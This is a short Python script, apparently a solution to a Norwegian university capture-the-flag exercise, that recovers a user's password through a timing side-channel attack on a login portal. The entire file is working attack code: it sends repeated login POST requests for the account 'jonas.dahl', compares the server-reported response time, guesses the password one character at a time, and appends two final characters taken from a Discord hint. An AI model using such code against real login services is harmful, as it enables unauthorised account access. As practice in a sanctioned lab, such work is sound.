# Import necessary modules
import requests
from json.decoder import JSONDecodeError

# Function to perform login attempt and check timing
def login(attempt_pw, a):
    # Define the URL for the login
    url = 'https://portal.regjeringen.uiaikt.no/login'
    # Define the username 
    uname = 'jonas.dahl'
    # payload with username and password
    d = {'username': uname, 'password': attempt_pw}
    try:
        # Send a POST request to login
        res = requests.post(url, json=d)
        # Raise an HTTPError for bad responses
        res.raise_for_status()
        # Extract total_time from the JSON response
        json_data = res.json()
        tot_time = json_data['total_time']
        # Check if the total_time is greater than a + 1
        return tot_time > a + 1
    except JSONDecodeError:
        # Handle JSON decoding error
        print("JSON decoding error. Response content:", res.text)
        return False
    except requests.exceptions.RequestException as e:
        # Handle other request errors
        print(f"Request error: {e}")
        return False

# Function to brute-force the password
def solve_password():
    print("ATTACK !!!!!!")
    # Based on bruteforce attempts, we know that the cycle changes when password length is 17
    pw = '11111111111111111'
    # All valid password characters, used to crack the password
    validchar = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
    # Empty string to store the password
    jonas_pw = ''
    # Index for characters found
    a = 0
    while a < 15:
        for valid in validchar:
            # Replaces character at index a in the password with the current valid character
            pw = pw[:a] + valid + pw[a + 1:]
            # Perform a login attempt with the modified password and check timing
            if login(pw, a):
                # If timing check passes, update the found password and print it
                jonas_pw += valid
                print(jonas_pw)
                break
        # Move to the next character position
        a += 1
    # Note from discord "Hint: det er en bug i timing attacket. Dere får ut 15 av 17. De siste to karakterene i
    # passordet er 23"
    print(f"Found: {jonas_pw}23")

    return jonas_pw



